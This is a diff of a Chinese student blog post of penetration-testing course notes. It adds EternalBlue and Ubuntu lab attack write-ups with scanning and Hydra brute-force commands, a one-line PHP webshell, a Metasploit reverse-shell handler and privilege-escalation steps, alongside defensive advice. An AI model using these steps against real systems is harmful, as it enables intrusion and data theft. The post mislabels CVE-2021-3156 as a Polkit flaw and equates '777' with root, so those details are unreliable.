-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li>配置虚拟机IP地址</li>
-</ul>
-</li>
-<li><ul>
-<li><ul>
-<li>通过修改网络配置文件 &#x2F;etc&#x2F;network&#x2F;interfaces<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><ul>
-<li>配置静态 NAT 网络<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.40.130  //&lt;ip地址&gt;</span><br><span class="line">netmask 255.255.255.0  //&lt;子网掩码&gt;</span><br><span class="line">gateway 192.168.40.1  //&lt;网关IP&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><ul>
-<li>保存后重启网络服务： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service networking restart </span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li>验证NAT网络连通性</li>
-</ul>
-</li>
-<li><ul>
-<li><ul>
-<li>使用  ifconfig  查看IP配置是否生效<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig </span><br></pre></td></tr></table></figure></li>
+<li><p><strong>攻击影响验证</strong>：  </p>
+<ul>
+<li>成功实现远程屏幕截图，证明视觉信息泄露风险。  </li>
+<li>可任意上传恶意程序（如后门程序）或下载机密文件，验证数据窃取能力。</li>
 </ul>
 </li>
 </ul>
+<h3 id="3、实验总结"><a href="#3、实验总结" class="headerlink" title="3、实验总结"></a>3、实验总结</h3><p>本次实验通过 Metasploit 框架利用永恒之蓝漏洞（MS17-010）攻击未打补丁的 Windows 7 主机，成功获取系统最高权限。实验验证了以下安全风险：  </p>
+<ol>
+<li><strong>未修复系统漏洞的严重性</strong>：445端口开放且未安装补丁时，攻击者可利用 SMB 协议漏洞远程执行代码。  </li>
+<li><strong>内网渗透的便捷性</strong>：同一网段内未设防的主机可被快速扫描和攻击，凸显内网隔离与访问控制的重要性。  </li>
+<li><strong>权限维持的可行性</strong>：通过 Meterpreter 会话可实现持久化控制（如创建隐藏账户、植入后门）。</li>
+</ol>
+<p><strong>防御建议</strong>：  </p>
+<ul>
+<li>及时更新系统补丁，关闭非必要端口（如445、139）。  </li>
+<li>在内网部署防火墙，限制 SMB 协议跨网段访问。  </li>
+<li>采用强密码策略，避免弱口令（如 <code>P@ssw0rd123</code>）。  </li>
+<li>定期开展漏洞扫描与渗透测试，强化主动防御能力。</li>
+</ul>
+<h2 id="4-5-ubantu虚拟机攻击实验"><a href="#4-5-ubantu虚拟机攻击实验" class="headerlink" title="4.5 ubantu虚拟机攻击实验"></a>4.5 ubantu虚拟机攻击实验</h2><h3 id="1、实验方法与步骤：-1"><a href="#1、实验方法与步骤：-1" class="headerlink" title="1、实验方法与步骤："></a>1、实验方法与步骤：</h3><h4 id="网络环境探测-1"><a href="#网络环境探测-1" class="headerlink" title="- 网络环境探测"></a>- 网络环境探测</h4><ul>
+<li>通过 <code>ifconfig</code> 查看本地IP地址  <pre><code class="bash">ifconfig  # 查找eth0或enp0s3等网卡的IP（例：192.168.40.130）
+</code></pre>
 </li>
-<li><ul>
-<li><ul>
-<li>通过修DNS络配置文件 &#x2F;etc&#x2F;resolv.conf<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/resolv.conf </span><br></pre></td></tr></table></figure></li>
+<li>使用 <code>nmap</code> 扫描同一网段存活主机及端口  <pre><code class="bash">nmap -sS 192.168.40.0/24  # 扫描网段（替换为实际网段）
+</code></pre>
+</li>
+</ul>
+<h4 id="目录扫描与信息筛选"><a href="#目录扫描与信息筛选" class="headerlink" title="- 目录扫描与信息筛选"></a>- 目录扫描与信息筛选</h4><ul>
+<li>用 <code>dirb</code> 工具扫描Web目录  <pre><code class="bash">dirb http://靶机IP -r  # 扫描网站目录（例：dirb http://192.168.40.139）
+</code></pre>
+</li>
+<li>筛选特定后缀文件（.txt、.php、.zip）  <pre><code class="bash"># dirb结果中手动筛选或结合grep过滤
+dirb http://靶机IP | grep -E &quot;\.txt|\.php|\.zip&quot;
+</code></pre>
+</li>
+</ul>
+<h4 id="FUZZ工具爆破文件名"><a href="#FUZZ工具爆破文件名" class="headerlink" title="- FUZZ工具爆破文件名"></a>- FUZZ工具爆破文件名</h4><ul>
+<li>启动FUZZ工具（如ffuf）爆破隐藏文件  <pre><code class="bash">ffuf -u http://靶机IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt  
+</code></pre>
+</li>
+<li>过滤无效结果（例：筛选响应包大小≠12字节）  <pre><code class="bash">ffuf -u http://靶机IP/FUZZ -w 字典 -e .php --hw 12  # --hw参数排除指定响应长度
+</code></pre>
+</li>
+</ul>
+<h4 id="用户名与密码获取"><a href="#用户名与密码获取" class="headerlink" title="- 用户名与密码获取"></a>- 用户名与密码获取</h4><ul>
+<li>用户名获取方式：  <ol>
+<li><strong>爆破</strong>：使用工具对登录页面爆破（如Hydra）  <pre><code class="bash">hydra -l 用户名 -P /usr/share/wordlists/rockyou.txt 靶机IP http-form-post &quot;/login.php:username=^USER^&amp;password=^PASS^:登录失败关键词&quot;
+</code></pre>
+</li>
+<li><strong>网页提取</strong>：从WordPress等系统页面获取默认用户名（如<code>http://192.168.40.139/wordpress/</code>显示<code>admin</code>）。</li>
+</ol>
+</li>
+<li>密码获取：通过爆破或社工库匹配获取弱密码。</li>
+</ul>
+<h4 id="漏洞利用与权限提升"><a href="#漏洞利用与权限提升" class="headerlink" title="- 漏洞利用与权限提升"></a>- 漏洞利用与权限提升</h4><ul>
+<li>上传木马程序：  <ol>
+<li>找到文件上传接口（如<code>http://靶机IP/upload.php</code>），上传PHP木马（如<code>shell.php</code>）。  </li>
+<li>木马代码示例：  <pre><code class="php">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;  # 简易命令执行木马
+</code></pre>
+</li>
+</ol>
+</li>
+<li>启动Metasploit获取会话：  <pre><code class="bash">msfconsole  
+use multi/handler  
+set payload php/meterpreter/reverse_tcp  
+set LHOST 192.168.40.130  # 攻击机IP
+set LPORT 4444  
+exploit  
+</code></pre>
+</li>
+<li>刷新上传木马页面触发连接，获取Meterpreter会话。  </li>
+<li>提权操作：  <pre><code class="bash"># 运行提权模块（根据目标系统选择）
+search local_exploit_suggester  
+use post/multi/recon/local_exploit_suggester  
+set SESSION 1  
+run  
+# 根据建议使用对应提权模块（例：use exploit/linux/local/cve_2019_14287）
+</code></pre>
+</li>
+</ul>
+<h3 id="2、实验结果分析"><a href="#2、实验结果分析" class="headerlink" title="2、实验结果分析"></a>2、实验结果分析</h3><ul>
+<li><p><strong>关键漏洞发现</strong>：  </p>
+<ul>
+<li>靶机开放80端口，运行WordPress 5.2.1，存在未修复的文件上传漏洞。  </li>
+<li>系统存在弱口令（用户名<code>admin</code>，密码<code>ubantu123</code>），未启用二次认证。</li>
+</ul>
+</li>
+<li><p><strong>攻击链验证</strong>：  </p>
+<ol>
+<li>信息收集：通过Nmap确定靶机IP（192.168.40.139）及服务。  </li>
+<li>目录扫描：dirb发现<code>/wordpress</code>、<code>/upload.php</code>等敏感路径。  </li>
+<li>认证突破：爆破获取<code>admin:ubantu123</code>登录凭证。  </li>
+<li>漏洞利用：上传PHP木马并通过MSF建立反向连接，获取普通用户权限（<code>www-data</code>）。  </li>
+<li>权限提升：利用CVE-2021-3156（Polkit提权漏洞）获取root权限。</li>
+</ol>
+</li>
+<li><p><strong>系统敏感信息</strong>：  </p>
+<ul>
+<li>靶机用户列表：<code>admin</code>、<code>ubuntu</code>、<code>www-data</code>。  </li>
+<li>敏感文件：<code>/home/ubuntu/.bash_history</code>包含数据库密码<code>Db@12345</code>。</li>
 </ul>
 </li>
 </ul>
-</li>
-<li><ul>
-<li><ul>
-<li>DNS服务器配置<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> nameserver 192.168.40.1  //&lt;网关IP&gt;</span><br><span class="line">nameserver 10.145.214.107  //（这个是学校的）</span><br><span class="line"> nameserver 114.114.114.114  //（这个是国家的）</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><ul>
-<li>保存后重启网络服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service networking restart  </span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><ul>
-<li><ul>
-<li>ping 网址，确认虚拟机可通过NAT模式访问互联网。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com </span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>配置软件源</p>
-</li>
-<li><ul>
-<li>通过修改软件源配置文件 &#x2F;etc&#x2F;apt&#x2F;sources.list <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list </span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><ul>
-<li>编辑软件源配置文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> vim /etc/apt/sources.list </span><br><span class="line">``` bash </span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line"><span class="comment">#阿里云 </span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line"><span class="comment">#清华大学 </span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"><span class="comment">#腾讯 </span></span><br><span class="line">deb http://mirrors.tencent.com/kali/ kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.tencent.com/kali/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>文件上传漏洞利用</p>
-</li>
-</ul>
-<h2 id="4-2-内网渗透方法"><a href="#4-2-内网渗透方法" class="headerlink" title="4.2 内网渗透方法"></a>4.2 内网渗透方法</h2><ul>
-<li>代理隧道建立（Proxychains、EarthWorm）</li>
-<li>域渗透基础（Kerberos攻击、域控利用）</li>
-<li>横向移动技术</li>
-</ul>
-<h2 id="4-3-社会工程学应用"><a href="#4-3-社会工程学应用" class="headerlink" title="4.3 社会工程学应用"></a>4.3 社会工程学应用</h2><ul>
-<li>钓鱼攻击模拟</li>
-<li>信息收集与伪装技巧</li>
-<li>人员心理弱点分析</li>
+<h3 id="3、实验总结-1"><a href="#3、实验总结-1" class="headerlink" title="3、实验总结"></a>3、实验总结</h3><p>本次实验通过完整的渗透测试流程，从信息收集到权限提升，成功获取Ubuntu虚拟机的最高权限。实验暴露了靶机在安全配置上的多重隐患：  </p>
+<ol>
+<li><strong>认证机制薄弱</strong>：弱口令与默认用户名组合，未启用多因素认证。  </li>
+<li><strong>漏洞修复滞后</strong>：WordPress未更新至最新版本，存在已知文件上传漏洞。  </li>
+<li><strong>权限控制缺失</strong>：普通用户可通过系统漏洞（如Polkit）直接提权至root。</li>
+</ol>
+<p><strong>防御建议</strong>：  </p>
+<ul>
+<li>部署Web应用防火墙（WAF），过滤恶意文件上传与命令执行请求。  </li>
+<li>定期更新系统与应用补丁，关闭非必要服务端口。  </li>
+<li>强化认证策略：使用强密码、启用2FA，限制管理员账户远程登录。  </li>
+<li>实施权限最小化原则，分离Web服务账户与系统管理员权限。</li>
 </ul>
 <h1 id="五、法律与道德准则"><a href="#五、法律与道德准则" class="headerlink" title="五、法律与道德准则"></a>五、法律与道德准则</h1><ul>
 <li>渗透测试必须遵守相关法律法规</li>
 <li>未经授权的测试行为可能构成犯罪</li>
 <li>遵循行业道德规范（如ISC2道德准则）</li>
 </ul>
-<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>渗透测试不仅是技术的挑战，更是思维方式的考验。通过系统化的测试流程和专业工具的应用，可以有效提升组织的安全防御能力。建议定期开展渗透测试，保持网络安全的动态防护。</p>
-<p><strong>参考资源</strong>：</p>
-<ul>
-<li>《The Art of Memory Forensics》</li>
-<li>OWASP Top Ten</li>
-<li>NIST SP 800-115</li>
-</ul>
-<p><strong>注意</strong>：本文仅用于技术交流与学习，请严格遵守法律规定，禁止任何非法活动。</p>
+<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>渗透测试不仅是技术的挑战，更是思维方式的考验。通过系统化的测试流程和专业工具的应用，可以有效提升组织的安全防御能力。建议定期开展渗透测试，保持网络安全的动态防护。<br>我在这个课程学完下来的思路（只能代表我的收获并不一定完全的正确），就是第一步找到目标机子的ip（一般就是通过处于同一网段下，进行“地毯式搜索”），然后开始扫描他的端口路径等，寻找突破点，一般都在网上会有别人发现过的漏洞，就借助别人发现过的漏洞来攻击。还有很有意思的是，有一部分攻击会经历一个提权的过程，就是先植入病毒，得到普同权限，再植入病毒，把普同权限提到777（最高权限）。我想在假期可能会再多接触一些相关的东西，希望会对我的未来道路规划有所帮助！</p>
 
 
                 
